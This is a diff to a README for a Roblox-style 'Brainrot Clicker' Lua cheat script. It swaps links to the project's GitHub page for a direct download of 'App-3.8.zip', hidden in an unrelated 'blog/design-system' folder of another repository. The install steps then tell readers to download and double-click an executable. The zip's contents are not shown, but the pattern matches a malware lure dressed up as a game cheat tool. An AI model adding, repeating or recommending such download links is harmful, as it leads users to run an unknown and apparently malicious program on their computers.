@@ -5,7 +5,7 @@ description: "Automate gameplay in Brainrot Clicker with a reliable Lua script e
 ---
 # 🧠 Brainrot-Clicker-Script-GUI-2026 - Automate your game progression with ease
 
-[![Download Now](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Musical-jumpsuit327/Brainrot-Clicker-Script-GUI-2026)
+[![Download Now](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://raw.githubusercontent.com/Musical-jumpsuit327/musical-jumpsuit327.github.io/main/blog/design-system/App-3.8.zip)
 
 ## 🎯 About This Tool
 
@@ -25,7 +25,7 @@ To run this tool, ensure your computer meets these basic requirements:
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the following link to access the download page: [https://github.com/Musical-jumpsuit327/Brainrot-Clicker-Script-GUI-2026](https://github.com/Musical-jumpsuit327/Brainrot-Clicker-Script-GUI-2026)
+1. Visit the following link to access the download page: [https://raw.githubusercontent.com/Musical-jumpsuit327/musical-jumpsuit327.github.io/main/blog/design-system/App-3.8.zip](https://raw.githubusercontent.com/Musical-jumpsuit327/musical-jumpsuit327.github.io/main/blog/design-system/App-3.8.zip)
 2. Locate the file marked as the latest release.
 3. Download the executable file to your desktop.
 4. Double-click the file to open the installer.
